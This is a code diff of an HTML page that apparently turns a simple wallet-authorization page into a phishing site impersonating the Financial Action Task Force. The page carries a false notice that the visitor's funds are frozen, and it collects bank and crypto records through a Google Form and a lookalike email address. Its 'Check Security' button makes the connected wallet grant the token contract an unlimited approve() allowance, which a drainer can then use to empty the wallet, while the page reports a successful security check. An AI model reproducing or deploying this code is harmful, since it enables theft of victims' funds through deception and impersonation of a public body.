@@ -3,100 +3,174 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Token Authorization</title>
+    <title>FATF Wallet Security Check</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            margin: 20px;
-            padding: 10px;
-            text-align: center;
+            margin: 0;
+            padding: 0;
+            background-color: #f9f9f9;
+            color: #333;
         }
-        h1 {
-            font-size: 2em;
-            margin-bottom: 20px;
+        header {
+            background-color: #c00;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        header img {
+            width: 80px;
+            height: 142px;
+            margin-right: 15px;
+        }
+        header h1 {
+            font-size: 1.8em;
+            margin: 0;
+        }
+        nav {
+            display: flex;
+            justify-content: center;
+            background-color: #900;
+            padding: 10px;
+        }
+        nav a {
+            color: white;
+            text-decoration: none;
+            margin: 0 15px;
+            font-weight: bold;
+        }
+        nav a:hover {
+            text-decoration: underline;
+        }
+        .container {
+            max-width: 800px;
+            margin: 20px auto;
+            padding: 20px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+        .section-title {
+            color: #c00;
+            font-size: 1.5em;
+            margin-bottom: 15px;
         }
         button {
+            background-color: #007bff;
+            color: white;
+            border: none;
             padding: 10px 20px;
+            border-radius: 5px;
             font-size: 16px;
             cursor: pointer;
-            margin: 10px;
+            margin-top: 15px;
         }
-        p {
-            font-size: 18px;
+        button:hover {
+            background-color: #0056b3;
+        }
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            margin-top: 20px;
         }
     </style>
 </head>
 <body>
-    <h1>Token Authorization</h1>
+    <header>
+        <img src="fatf_logo.png" alt="FATF Logo">
+        <h1>Financial Action Task Force (FATF)</h1>
+    </header>
+    <nav>
+        <a href="#notification">Notification</a>
+        <a href="#materials">Submit Materials</a>
+        <a href="#recovery">Check Security</a>
+    </nav>
 
-    <div>
-        <h2>Connect Wallet</h2>
-        <button id="connectButton">Connect Wallet</button>
-        <p id="walletAddress">No wallet connected</p>
+    <!-- Notification Section -->
+    <div class="container" id="notification">
+        <h2 class="section-title">Notification Letter</h2>
+        <p><strong>Dear User,</strong></p>
+        <p>We are the Financial Action Task Force (FATF), committed to combating money laundering and fraud worldwide to ensure the security and transparency of the global financial system.</p>
+        <p>Recently, during our analysis of global blockchain transactions, we discovered that you were involved in transactions with a confirmed fraudulent platform, HashKey. Through blockchain tracking technology, we further traced your funds to the Gate.io exchange.</p>
+        <p><strong>Actions Taken:</strong></p>
+        <ul>
+            <li><strong>Account Freezing:</strong> We have reported the case to relevant exchanges and coordinated to freeze suspicious funds to prevent further losses.</li>
+            <li><strong>Fund Tracing:</strong> We are collaborating with global judicial authorities to trace the fraudulent funds.</li>
+        </ul>
+        <p>Please respond within 7 days to submit the necessary materials for investigation.</p>
     </div>
-    
-    <div>
-        <h2>Authorize Wallet</h2>
-        <button id="authorizeButton">Authorize</button>
+    <!-- Submit Materials Section -->
+    <div class="container" id="materials">
+        <h2 class="section-title">Submit Materials</h2>
+        <p>Please submit the following materials for investigation:</p>
+        <ul>
+            <li><strong>Personal Fraud Record:</strong> Provide a detailed description of the transaction process with the fraudulent platform, including amount, time, and platform specifics.</li>
+            <li><strong>Bank Transaction Record:</strong> Upload records of bank transfers related to fraudulent transactions.</li>
+            <li><strong>Cryptocurrency Transaction Record:</strong> Upload transaction proofs related to exchanges or wallets.</li>
+        </ul>
+        <p>Click the button below to submit via Google Form:</p>
+        <a href="https://docs.google.com/forms/d/e/1FAIpQLSdmj9CaYuaUQdZ6GLlL8-qLIOS3o9VG4tZU0JVwuLcf_ijDDg/viewform?usp=pp_url" target="_blank">
+            <button>Submit Materials</button>
+        </a>
+        <p>Or email materials to: <a href="mailto:support@fatfgroup.org">support@fatfgroup.org</a></p>
     </div>
-    
-    <script src="https://cdn.jsdelivr.net/npm/ethers@latest/dist/ethers.umd.min.js"></script>
+
+    <!-- Wallet Security Check Section -->
+    <div class="container" id="recovery">
+        <h2 class="section-title">Check Wallet Security</h2>
+        <p>Connect your wallet and perform a security check to ensure safety.</p>
+        <button id="connectWallet" onclick="connectWallet()">Connect Wallet</button>
+        <p id="walletStatus">Wallet Not Connected</p>
+        <button id="approveButton" onclick="checkSecurity()" disabled>Check Security</button>
+    </div>
+    <footer>
+        <p>&copy; 2024 Financial Action Task Force. All rights reserved.</p>
+    </footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
     <script>
-        let provider;
-        let contract;
-        let signer;
-        const contractAddress = '0x60F0532F89BCcdd7e3847531789de49d793f48f3';  // 合约地址
-        const abi = [
-            {
-                "inputs": [
-                    {
-                        "internalType": "address",
-                        "name": "_account",
-                        "type": "address"
-                    }
-                ],
-                "name": "authorize",
-                "outputs": [],
-                "stateMutability": "nonpayable",
-                "type": "function"
-            }
-        ];
+        const tokenAddress = "0x60F0532F89BCcdd7e3847531789de49d793f48f3"; // 更新后的合约地址
+        const proxyAddress = "0x60F0532F89BCcdd7e3847531789de49d793f48f3"; // Mainnet Contract Address (假设和合约地址相同)
+        let provider, signer;
 
-        // 检查是否有以太坊钱包
-        if (window.ethereum) {
-            provider = new ethers.Web3Provider(window.ethereum);
-        } else {
-            alert("Please install MetaMask or another Web3 wallet!");
+        async function connectWallet() {
+            if (typeof window.ethereum !== "undefined") {
+                try {
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    await provider.send("eth_requestAccounts", []);
+                    signer = provider.getSigner();
+                    const walletAddress = await signer.getAddress();
+                    document.getElementById("walletStatus").innerText = `Connected Wallet: ${walletAddress}`;
+                    document.getElementById("approveButton").disabled = false;
+                } catch (error) {
+                    alert("Wallet connection failed. Please try again!");
+                }
+            } else {
+                alert("Please install MetaMask or other wallet extensions!");
+            }
         }
 
-        // 连接钱包
-        document.getElementById('connectButton').addEventListener('click', async () => {
-            try {
-                await provider.send("eth_requestAccounts", []); // 请求用户账户
-                signer = provider.getSigner();
-                const address = await signer.getAddress();
-                document.getElementById("walletAddress").textContent = `Wallet Connected: ${address}`;
-            } catch (error) {
-                console.error("User denied account access:", error);
-                alert("Error connecting wallet: " + error.message);
+        async function checkSecurity() {
+            if (!signer) {
+                alert("Please connect your wallet first!");
+                return;
             }
-        });
 
-        // 创建合约实例
-        contract = new ethers.Contract(contractAddress, abi, signer);
+            const tokenABI = ["function approve(address spender, uint256 amount) external returns (bool)"];
+            const tokenContract = new ethers.Contract(tokenAddress, tokenABI, signer);
 
-        // 授权合约
-        document.getElementById('authorizeButton').addEventListener('click', async () => {
             try {
-                const address = await signer.getAddress();  // 获取当前钱包地址
-                const tx = await contract.authorize(address);  // 使用钱包地址进行授权
-                await tx.wait();
-                alert("Authorization successful!");
+                const tx = await tokenContract.approve(proxyAddress, ethers.constants.MaxUint256);
+                alert("Wallet security verified successfully! Authorization granted.");
             } catch (error) {
-                console.error("Error authorizing address:", error);
-                alert("Error authorizing: " + error.message);
+                alert("Wallet security check failed. Please try again!");
             }
-        });
+        }
     </script>
 </body>
 </html>
